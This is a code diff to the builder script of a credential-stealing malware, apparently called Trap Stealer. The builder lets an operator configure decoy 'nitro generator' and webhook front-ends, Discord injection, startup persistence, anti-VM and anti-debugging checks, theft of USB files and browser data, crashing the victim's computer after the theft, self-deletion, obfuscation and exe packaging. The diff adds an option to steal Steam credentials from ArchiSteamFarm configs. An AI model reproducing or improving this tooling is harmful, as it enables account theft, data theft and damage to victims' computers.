@@ -135,19 +135,21 @@ while True:
             print('Invalid Webhook')
 
 
-    FakeWeb = get_boolean_input('Do you want to enable Fake Webhook Module (When the file is launched it will show a Webhook Tools while getting data) Y/N: ')
-    FakeGen = get_boolean_input('Do you want to enable Fake Generator Module (When the file is launched it will show a nitro generator while getting data) Y/N: ')
-    Injection = get_boolean_input('Do you want to inject the script to discord Startup Y/N: ')
-    Startup = get_boolean_input('Do you want to add the file to the startup folder? Y/N: ')
-    No_Debug = get_boolean_input('Do you want to enable VM Checker and Anti Debugging Y/N: ')
-    Close = get_boolean_input('Do you want to prevent Discord from being launched again? Y/N: ')
-    OneTime = get_boolean_input('Do you want to add the anti-spammer (so he can launch only every 30 minutes)? Y/N: ')
+    FakeWeb = get_boolean_input('Enable Fake Webhook Module (When the file is launched it will show a Webhook Tools while getting data) Y/N: ')
+    FakeGen = get_boolean_input('enable Fake Generator Module (When the file is launched it will show a nitro generator while getting data) Y/N: ')
+    Injection = get_boolean_input('Inject the script to discord Startup Y/N: ')
+    Startup = get_boolean_input('Add the file to the startup folder? Y/N: ')
+    No_Debug = get_boolean_input('Enable VM Checker and Anti Debugging Y/N: ')
+    Close = get_boolean_input('Prevent Discord from being launched again? Y/N: ')
+    OneTime = get_boolean_input('Add the anti-spammer (so he can launch only every 30 minutes)? Y/N: ')
     melter = get_boolean_input('Do you enable melter (Delete the file after using it DONT WORK WITH CRASHER) ? Y/N: ')
     crasher = get_boolean_input('Do you want the program to make the computer crash after it stole everything? Y/N: ')
     hide = get_boolean_input('Do you want the program to make the console invisible? Y/N: ')
-    change = get_boolean_input('Do you want to change the user (discord account) about me with custom text? Y/N: ')
-    Drive = get_boolean_input('Do you want to steal all connected USB files (may make the stealer slower) Y/N')
-    Kill_process = get_boolean_input('Do you want to kill process (chrome, brave, firefox, to steal at 100%) Y/N')
+    change = get_boolean_input('Change the user (discord account) about me with custom text? Y/N: ')
+    Drive = get_boolean_input('Steal all connected USB files (may make the stealer slower) Y/N')
+    Kill_process = get_boolean_input('kill process (chrome, brave, firefox, to steal at 100%) Y/N')
+    ArchiStealer = get_boolean_input('Want to steal all config files (retrieve all steam password and username found in ArchiSteamFarm) Y/N')
+
     if change:
         bio = input(r'''Input the text you want the user to have in his about me (Right-click to paste) or put \n to skip a line -> ''')
 
@@ -208,7 +210,9 @@ while True:
     new_content = new_content.replace("'%FileIOYesOrNo%'", str(fileio))
     new_content = new_content.replace("'%CatBoxMoeYesOrNo%'", str(catbox))
     new_content = new_content.replace("'%Drive%'", str(Drive))
-    new_content = new_content.replace("'%CloseProc'", str(Kill_process))
+    new_content = new_content.replace("'%CloseProc%'", str(Kill_process))
+    new_content = new_content.replace("'%ArchiStealer%'", str(ArchiStealer))
+
     
     if change:
         new_content = new_content.replace("'%Text%'", str(f"'''{bio}'''"))
@@ -218,9 +222,9 @@ while True:
     clear_console()
     print('Created [+]')
 
-    Obfuscation = input('Do you want to obfuscate it? Y/N: ')
+    Obfuscation = input('obfuscate it? Y/N: ')
     Obfuscation = Obfuscation.lower()
-    Exe = input('Do you want to make Trap Stealer with the exe format? (Take some time) Y/N: ')
+    Exe = input('make Trap Stealer with the exe format? (Take some time) Y/N: ')
     Exe = Exe.lower()
     name = input('Enter how you want the file to be named (Do not put the extension): ')
     output_py = f'./Build/{name}.py'
@@ -260,7 +264,7 @@ while True:
     while True:
         if Exe in ['y', 'yes']:
             
-            ask = input('Do you want to make it exe with pyinstaller or with IExpress? (Yes if pyinstaller) (No if IExpress)')
+            ask = input('make it exe with pyinstaller or with IExpress? (Yes if pyinstaller) (No if IExpress)')
             if ask in ["yes","y"]:
                 from sys import executable
                 icon_path = input('Enter the path to the icon file (leave blank for no icon): ')
